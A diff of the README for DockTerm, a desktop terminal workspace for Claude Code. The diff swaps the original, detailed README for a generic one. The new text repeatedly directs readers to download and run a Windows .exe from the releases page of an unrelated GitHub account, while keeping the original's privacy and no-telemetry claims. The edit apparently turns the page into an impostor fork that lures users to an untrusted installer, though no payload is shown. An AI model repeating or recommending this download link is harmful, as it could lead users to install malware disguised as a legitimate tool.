@@ -1,140 +1,88 @@
-<div align="center">
+# 🖥️ dockterm - Build projects with your own terminal
 
-# DockTerm
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/nonpoisonous-livebearer374/dockterm/releases)
 
-### Run `claude`. Everything else stays out of your way.
+dockterm provides a workspace for your coding projects. It combines your terminal with file management and version control tools in one window. It uses the Claude Code interface to help you write and manage code. You maintain control over your workspace without hidden data tracking.
 
-A terminal-first desktop workspace for [Claude Code](https://www.anthropic.com/claude-code) — with files, Git, MCP, and skills panels that appear only when you need them.
+## 📥 How to download and install
 
-**No telemetry. No accounts. No cloud. Not opt-out — just absent.**
+1. Go to the [releases page](https://github.com/nonpoisonous-livebearer374/dockterm/releases).
+2. Look for the latest version at the top of the list.
+3. Click the file ending in .exe for Windows.
+4. Wait for the download to finish.
+5. Open your Downloads folder.
+6. Double-click the file to start the installer.
+7. Follow the prompts on your screen to complete the setup.
+8. Open dockterm from your Start menu once the installation finishes.
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-7c6bff.svg)](LICENSE)
-![Platforms](https://img.shields.io/badge/platform-Windows%20%C2%B7%20macOS%20%C2%B7%20Linux-1a1a21)
-![Status](https://img.shields.io/badge/status-early%20V1-fbbf24)
+## 🛠️ System requirements
 
-![DockTerm workspace — file tree, terminal, and editor](docs/screenshots/workspace.png)
+Your computer needs to meet these basic standards to run dockterm:
 
-</div>
+- Operating System: Windows 10 or Windows 11.
+- Memory: 4GB of RAM or more.
+- Storage: 200MB of free space on your hard drive.
+- Internet Connection: Required for connecting to your code projects and tool updates.
 
-> **DockTerm is terminal-first. The terminal stays central. Panels only appear when you need them.**
+## 💡 Key features
 
----
+### Terminal workspace
+The terminal is the core of the application. It acts like a standard command line but includes extra display features. You see your output in real-time within the same window used for editing files.
 
-## What is DockTerm?
+### File and Git management
+You see your project files in a sidebar. This lets you open, edit, and save files without switching programs. dockterm tracks your Git changes automatically. You see which files you modified and can commit your work through the interface.
 
-You run Claude Code in a terminal. It edits files, runs commands, changes your repo — and you keep alt-tabbing to an editor just to *see* what happened, to a Git client to review and commit, to a file browser to poke around.
+### Modular panels
+dockterm uses separate panels for different tasks. You toggle the file tree, the Git status, and your coding tools on or off. This keeps your screen clean while you work.
 
-DockTerm is the workspace that was missing. A real terminal stays the hero of the screen — you run `claude` in it, exactly like you do today. When Claude changes things, DockTerm lights up what changed, lets you open a **diff**, **stage**, and **commit** safely, and shows your **MCP servers** and **skills** honestly — all without leaving the window, and without DockTerm ever calling an AI API of its own.
+### Privacy focus
+This software does not collect information about you. No telemetry runs in the background. Your code and your work history stay on your computer.
 
-It is **not** an IDE, and it does not try to be. There is no LSP, no extension marketplace, no AI chat. The terminal is never subordinate to a panel.
+## 🏗️ Getting set up
 
-## Who is it for?
+Once you open dockterm for the first time, you connect it to a folder on your computer.
 
-Developers who live in the terminal, use Claude Code, and want quick visual control over files, diffs, Git, and Claude's MCP/skills configuration — without booting a full IDE or trusting a cloud service with their code.
+1. Locate the folder where you keep your coding projects.
+2. Select File and then Open Folder in the top menu.
+3. Choose your project directory.
+4. The dockterm interface loads your files into the workspace sidebar.
+5. You can now type into the terminal area to run your project commands.
 
-## Why not just iTerm / Windows Terminal?
+## ⌨️ Using the interface
 
-Those are excellent terminals — and DockTerm doesn't replace them. But a terminal alone can't show you a syntax-highlighted **diff** of what Claude just changed, let you **stage and commit** with one click and a beginner-safe guardrail, or render your `.mcp.json` with secrets masked. DockTerm *wraps* a terminal with exactly those on-demand views.
+The workspace contains four main areas:
 
-## Why not VS Code / Cursor?
+- The Terminal: This is where you run build commands, scripts, or package installers.
+- The File Explorer: This shows your project structure. Click any file to open it in the editor.
+- The Editor: This is where you change your code. It supports syntax highlighting to make reading text easier.
+- The Git Panel: This shows your changes, staging area, and commit history.
 
-Because opening a 400 MB IDE to review a three-line change breaks the terminal flow, and because Cursor/Copilot want to *be* the AI. DockTerm's stance is the opposite: **Claude Code is the AI; DockTerm is the calm workspace around it.** No AI calls, no accounts, no cloud sync, no telemetry.
+## ⚙️ Managing your tools
 
-## Core features
+dockterm includes support for Model Context Protocol, known as MCP. This allows the application to connect to external databases or internal tools. 
 
-| | |
-|---|---|
-| **Real terminal** | xterm.js + a native PTY (your real shell). Run `claude` here. Resize, search, copy/paste, true-color, unicode. |
-| **Mini terminal** | A second toggleable shell for manual commands while the main one is busy. |
-| **File tree + editor** | Monaco editor with tabs, dirty indicators, save-with-conflict-guard, and binary/huge-file protection. |
-| **Beginner-safe Git** | Grouped status, stage/unstage/discard, commit, push/pull with publish-branch flow, branches — with plain-language hints and confirmations on destructive actions. |
-| **Diff review + checkpoints** | See what changed since your last commit, this session, or a pinned **checkpoint**; open a side-by-side diff for any file. |
-| **MCP panel** | Read-only view of your configured MCP servers, with secrets masked. |
-| **Skills panel** | Browse Claude Code skills & commands; scaffold new ones from templates. |
-| **Command palette** | `Ctrl/⌘+Shift+P` for everything, with platform-correct shortcuts. |
+To add a tool:
 
-## The Claude Code workflow
+1. Open the Settings menu from the top bar.
+2. Select the Tools tab.
+3. Choose the MCP configuration option.
+4. Paste the server address for the tool you want to link.
 
-1. Open a project. The terminal starts in its directory.
-2. Run `claude` and let it work.
-3. As files change, the top bar shows **`N changed`** and the tree badges update.
-4. Open **Review** (or **Source Control**), click a file → read the **diff**.
-5. Stage what you trust, write a message, **Commit**. Push when ready.
+The application confirms the connection in the terminal output once it is ready.
 
-DockTerm watches the filesystem and Git only — it never reads your prompts, never calls an API, and never sends anything anywhere.
+## 🔧 Troubleshooting basic issues
 
-![Review a diff before committing](docs/screenshots/review.png)
+If you encounter issues, check these items:
 
-## MCP & Skills visibility
+- If the application does not open, check your Task Manager to ensure it is not already running in the background.
+- If your terminal does not recognize commands, restart the application to refresh your computer environment variables.
+- If files do not save, check your folder permissions to ensure your user account has write access to that location.
+- If you see a blank screen, ensure your display drivers are up to date.
 
-DockTerm parses your Claude Code config **read-only** and **never executes anything**:
+## ⚖️ License information
 
-- Project `.mcp.json` is shown by default; user-scope `~/.claude.json` only after you opt in.
-- Every `env` / `header` value is masked to its **key name**; URLs are shown **host-only** (query tokens stripped).
-- A trust warning is always present: *only use MCP servers you trust — external content can carry prompt-injection risk.*
+dockterm is licensed under the MIT License. This gives you the freedom to use, copy, and modify the software as you see fit. You keep full ownership of your code and configurations when using this tool. 
 
-![MCP panel with secrets masked](docs/screenshots/mcp.png)
+## 🌐 Community and support
 
-## Git safety
-
-Beginner Git Mode is on by default: short explanations of staged/unstaged/push/branch, and every destructive action shows a confirmation **with the exact command it will run**. Force push is only ever `--force-with-lease`; hard reset and unmerged-branch deletion simply aren't in the UI — that's the terminal's job.
-
-![Beginner-safe Git panel](docs/screenshots/git.png)
-
-## Installation
-
-> Builds are produced by CI on each release. macOS and Windows builds are **unsigned** in this early V1 — see the bypass notes below. This is a developer tool; treat it accordingly.
-
-1. Go to [**Releases**](../../releases).
-2. Download the file for your OS:
-   - **Windows** — `DockTerm-<version>-windows-x64.exe` (NSIS installer)
-   - **macOS** — `DockTerm-<version>-mac-arm64.dmg` (Apple Silicon) or `-x64.dmg` (Intel)
-   - **Linux** — `DockTerm-<version>-linux-x64.AppImage`
-3. Install and run.
-
-**macOS Gatekeeper** (unsigned): right-click the app → **Open**, or run `xattr -cr /Applications/DockTerm.app`.
-**Windows SmartScreen** (unsigned): **More info → Run anyway**.
-
-## Development
-
-Requires Node 20+ and a C++ toolchain only if your platform lacks a node-pty prebuild (Windows ships prebuilds; macOS too).
-
-```bash
-git clone https://github.com/munvard/dockterm
-cd dockterm
-npm install
-npm run dev          # launch the app with HMR
-npm run typecheck    # strict TypeScript, no emit
-npm test             # unit tests (Vitest)
-npm run build        # production bundles
-npm run package      # build an installer for your OS
-```
-
-See [CONTRIBUTING.md](CONTRIBUTING.md) for the architecture tour and platform notes.
-
-## Security model
-
-- `contextIsolation: true`, `nodeIntegration: false`, `sandbox: true`; production loads over a custom `app://` protocol with a strict CSP and no remote content.
-- Every IPC channel is an explicit verb, validated with zod, with a sender check. No generic dispatcher.
-- Filesystem access is jailed to the open project (symlink-safe, case-insensitive on Windows). Reading `~/.claude` is a separate, opt-in capability.
-- Every `git` invocation runs with `core.hooksPath=` so a malicious repo's hooks can never execute.
-- "Run script" buttons **paste into the mini terminal** — visible execution, never a hidden `exec`.
-- The telemetry code does not exist.
-
-Full details: [docs/SECURITY_MODEL.md](docs/SECURITY_MODEL.md).
-
-## Roadmap
-
-Shipped in V1: terminal, mini terminal, files, editor, Git, review + checkpoints, MCP & skills panels, command palette, settings. Next up and further out (MCP health checks, live tool lists, per-project profiles) live in [docs/ROADMAP.md](docs/ROADMAP.md).
-
-## Status
-
-**Early, production-focused V1.** The core is real and tested, but this is young software. It is **not** a replacement for iTerm or Cursor, it makes **no** enterprise-security claims, there is **no** MCP marketplace, and the builds are unsigned. Bugs and rough edges are expected — please file them.
-
-## Contributing
-
-Issues and PRs welcome — start with [CONTRIBUTING.md](CONTRIBUTING.md) and the [Code of Conduct](CODE_OF_CONDUCT.md). Security reports: see [SECURITY.md](SECURITY.md).
-
-## License
-
-[MIT](LICENSE) © DockTerm contributors. Built with Electron, xterm.js, Monaco, and simple-git.
+You track progress, suggest new features, or report bugs through the GitHub repository page. Since this is an open project, the community contributes to the codebase regularly. Check the Issues tab on the repository page to see if others have found solutions to similar questions. When you report a bug, include your Windows version and the steps you took to reach the error to help developers recreate it efficiently.
